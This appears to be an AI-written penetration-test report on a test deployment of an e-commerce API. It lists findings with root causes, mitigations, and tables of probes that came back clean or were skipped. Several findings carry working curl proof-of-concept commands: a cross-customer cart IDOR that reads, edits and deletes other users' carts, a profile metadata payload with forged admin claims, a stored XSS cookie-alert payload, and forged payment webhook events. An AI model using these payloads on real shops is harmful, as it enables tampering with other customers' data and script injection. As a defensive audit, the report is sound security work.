# Adversarial VAPT Report — Live Instance

**Date:** 2026-05-10
**Target:** `https://unified-commerce-vapt.fly.dev`
**Auditor:** Codex adversarial (beyond-manager probe matrix)
**Manager probe matrix:** `scripts/ecommerce-vapt.sh` (24 probes)

---

## Working Exploits

### FINDING 1 — Cross-Customer Cart IDOR (Read + Write + Delete)

**Severity: CRITICAL**
**Class:** A01 Broken Access Control / IDOR
**Manager probe A1 addressed this surface but the fix introduced a regression.**

The fix for A1 (commit `2beb6bb`) strips `customerId` from the request body for customer-role actors, forcing it to `null`. But `assertCartOwnership()` in `packages/core/src/modules/cart/service.ts:564` treats `customerId == null` as a guest cart and returns immediately — no ownership check. Every customer cart is now effectively unowned.

Additionally, `assertCartReadAccess()` at line 606 allows any authenticated actor with `cart:read` permission to read guest carts. Customer role has `cart:read`, so any authenticated customer can read any cart.

**Impact:** Any authenticated customer can:
- Read any other customer's cart (line items, prices, metadata)
- Add items to any cart
- Modify item quantities in any cart
- Delete items from any cart

**PoC — Read:**
```bash
# Customer A creates a cart
curl -sS -b $JAR_A -X POST $BASE/api/carts \
  -H 'content-type: application/json' \
  -d '{"currency":"USD"}'
# → {"data":{"id":"CART_ID","customerId":null,...}}

# Customer B reads A's cart (different session cookie)
curl -sS -b $JAR_B $BASE/api/carts/CART_ID
# → HTTP 200 — full cart contents returned
```

**PoC — Write (add item):**
```bash
curl -sS -b $JAR_B -X POST $BASE/api/carts/CART_ID/items \
  -H 'content-type: application/json' \
  -d '{"entityId":"PRODUCT_ID","quantity":1}'
# → HTTP 201 Created
```

**PoC — Write (modify quantity):**
```bash
curl -sS -b $JAR_B -X PATCH $BASE/api/carts/CART_ID/items/ITEM_ID \
  -H 'content-type: application/json' \
  -d '{"quantity":100}'
# → HTTP 200
```

**PoC — Delete:**
```bash
curl -sS -b $JAR_B -X DELETE $BASE/api/carts/CART_ID/items/ITEM_ID
# → {"data":{"deleted":true}} — HTTP 200
```

**Root cause:** `service.ts:119` resolves `customerId` to `null` for customer-role actors. `service.ts:564` treats null-customerId carts as guest carts. The fix should resolve customerId from the **authenticated session** (server-side customer profile ID), not discard it.

**Mitigation:**
```typescript
// In cart service create(), instead of:
const resolvedCustomerId = isStaffActor ? (input.customerId ?? null) : null;

// Resolve from the authenticated customer profile:
const resolvedCustomerId = isStaffActor
  ? (input.customerId ?? null)
  : (actor?.customerId ?? actor?.userId ?? null);
```

---

### FINDING 2 — Arbitrary Metadata Injection in Customer Profile

**Severity: MEDIUM**
**Class:** A04 Insecure Design / Data Integrity
**Not probed by manager's matrix.**

Any authenticated customer can write arbitrary key-value pairs to the `metadata` field on their profile via `PATCH /api/me/profile`. This includes fake authorization claims.

**Impact:** Downstream systems that read profile `metadata` for authorization or display decisions could be deceived. While the core authorization engine correctly resolves permissions from the actor (not metadata), the data integrity risk is real — any admin panel, analytics pipeline, or webhook consumer that reads `metadata.role` would see the injected value.

**PoC:**
```bash
curl -sS -b $JAR_A -X PATCH $BASE/api/me/profile \
  -H 'content-type: application/json' \
  -H "Origin: $BASE" \
  -d '{"metadata":{"role":"admin","permissions":["*:*"],"isVerified":true}}'
# → HTTP 200
# Response: {"data":{"metadata":{"role":"admin","permissions":["*:*"],"isVerified":true},...}}
```

**Mitigation:** Whitelist the fields accepted by `PATCH /api/me/profile`. The `metadata` field should either be read-only, accept only specific keys, or be validated against a schema.

---

### FINDING 3 — Stored XSS Payload in Phone Field

**Severity: LOW (API-level) → MEDIUM (if frontend renders unescaped)**
**Class:** A03 Injection / Stored XSS
**Manager probe H1 tested reviews but not profile fields.**

The `phone` field in `PATCH /api/me/profile` accepts and persists HTML/XSS payloads verbatim.

**PoC:**
```bash
curl -sS -b $JAR_A -X PATCH $BASE/api/me/profile \
  -H 'content-type: application/json' \
  -H "Origin: $BASE" \
  -d '{"phone":"<img src=x onerror=alert(document.cookie)>"}'
# → HTTP 200
# Profile response echoes: "phone":"<img src=x onerror=alert(document.cookie)>"
```

**Mitigation:** The API mitigates this with `Content-Type: application/json` and `X-Content-Type-Options: nosniff`, so browsers won't render the response as HTML. However, any storefront that renders `phone` without escaping is vulnerable to stored XSS. Sanitize or strip HTML tags on input.

---

### FINDING 4 — Wishlist Plugin Unhandled 500

**Severity: LOW (availability / error-handling)**
**Not probed by manager's matrix.**

`GET /api/wishlist` and `POST /api/wishlist` both return HTTP 500 with `{"error":{"code":"INTERNAL_ERROR","message":"An unexpected error occurred."}}` for authenticated users. The error is sanitized (no stack trace), but the 500 indicates an unhandled exception in the wishlist plugin — likely a missing database table, configuration issue, or null dereference.

**Impact:** Feature broken for all users. If the 500 is caused by unhandled input, it may indicate a deeper issue.

**PoC:**
```bash
curl -sS -b $JAR_A $BASE/api/wishlist
# → HTTP 500
curl -sS -b $JAR_A -X POST $BASE/api/wishlist -H 'content-type: application/json' \
  -H "Origin: $BASE" -d '{"entityId":"c368f01c-74ee-4595-b884-ec5127fe72c3"}'
# → HTTP 500
```

---

### FINDING 5 — Payment Webhook Accepts Unauthenticated Events

**Severity: LOW (mock adapter) → MEDIUM (if adapter has weak verification)**
**Class:** A08 Software & Data Integrity / A01 Missing Auth
**Manager probe matrix did not test the payment receiver endpoint directly.**

`POST /api/payments/webhook` accepts unauthenticated POST requests and returns `{"data":{"received":true}}`. With the current mock payment adapter, `verifyWebhook()` returns fixed mock data — the attacker's payload is discarded. But the endpoint itself performs no authentication check, relying entirely on the payment adapter's signature verification.

**PoC:**
```bash
curl -sS -X POST $BASE/api/payments/webhook \
  -H 'content-type: application/json' \
  -d '{"id":"evt_fake","type":"payment_intent.succeeded","data":{}}'
# → HTTP 200 {"data":{"received":true,"duplicate":true}}
```

**Mitigation:** The current mock adapter is safe because it returns fixed data. But the architecture should add an authentication gate (IP allowlist, shared secret header, or both) at the route level as defense-in-depth, independent of the adapter's verification.

---

## Probes That Returned Clean

| Probe | Result | Notes |
|---|---|---|
| Alternative endpoints (/graphql, /admin, /internal) | 404 | No hidden surfaces |
| Better Auth admin endpoints (/api/auth/admin/*) | 404 | Not mounted |
| Jobs runner (/api/jobs/run) | 403 | Admin-only gate works |
| API key management endpoints | 404 | No customer-facing API key CRUD |
| Search injection (pg_sleep, UNION, FTS operators) | Clean | Parameterized queries via Drizzle |
| Search extreme length (10K chars) | 422 | Validation enforced |
| Promotion timing enumeration (10 fake codes) | Clean | No statistically significant timing variance |
| Cookie hardening (SameSite, HttpOnly, Secure, __Secure-) | Clean | SameSite=Lax, token rotated on sign-up |
| Session fixation | Clean | New token issued; pre-set cookie replaced |
| Media upload (/api/media/upload) | 403 | Permission-gated for customer role |
| Webhook SSRF (/api/webhooks) | 403 | webhooks:manage permission enforced |
| Anonymous cart creation | 403 | Auth required |
| Cart list endpoint | 404 | No enumeration surface |
| Cart ID brute force (timing) | Clean | UUID v4 makes infeasible; no timing oracle |
| Audit log (/api/audit) | 403 | Permission-gated |
| HTTP method tampering | Clean | PUT/DELETE rejected |
| Mass assignment on signup | Clean | Better Auth strips unknown fields |
| Mass assignment on profile (role, orgId, email) | Clean | Elevated fields rejected |
| Address XSS | 422 | Validation rejected malformed input |
| Catalog creation (customer role) | 422/404 | Permission gate works |
| Inventory access (customer role) | 404 | No surface |
| Order IDOR (/api/orders as customer) | 403 | Permission denied with clear message |
| Cart ID random guess | 404/422 | No existence leak |
| Content-type text/xml on cart create | Works | Creates cart with defaults — no injection |
| Time-based user enumeration | Inconclusive | ~680ms valid vs ~607ms invalid; small sample, within noise |

---

## Probes That Need State to Test (Skipped)

| Probe | Reason |
|---|---|
| Webhook URL SSRF with admin token | Customer role blocked (403). Need staff/admin session to test URL validation against `169.254.169.254`, `localhost`, `file://`, `gopher://`. The `isPrivateUrl` function exists in code but can't confirm it works live without elevated access. |
| Checkout IDOR completion | B's checkout on A's cart returned 422 (validation), but couldn't confirm if this is auth or schema validation. May succeed with correct payload shape. |
| Coupon race condition (B2) | No known valid promotion codes in the live deploy. Need to know or create one. |
| Order state escalation | No orders exist in the deploy for customer accounts. Need a completed checkout first. |
| API key scope confusion | No API key management endpoint accessible to customer. Need admin to create a scoped key, then test it against out-of-scope endpoints. |
| Cart metadata on create | `metadata` field was stripped on cart creation (returned `{}`), but couldn't confirm if it's ignored or validated. |

---

## Verdict

**OWNED** — Finding 1 (Cross-Customer Cart IDOR) is a critical vulnerability introduced by the manager's fix for A1. The fix for `customerId` forgery went too far: instead of resolving `customerId` from the authenticated session, it set it to `null`, which bypassed the ownership assertion that treats null-customer carts as guest carts. Any authenticated user can read, modify, and delete any other user's cart contents. This is directly exploitable in production.

The remaining findings (metadata injection, stored XSS in phone, wishlist 500, webhook auth) are medium-to-low but should be addressed. The 20+ probes that returned clean confirm the manager's security posture is solid in other areas — auth hardening, permission gates, input sanitization, cookie security, and rate limiting all hold up under adversarial testing.
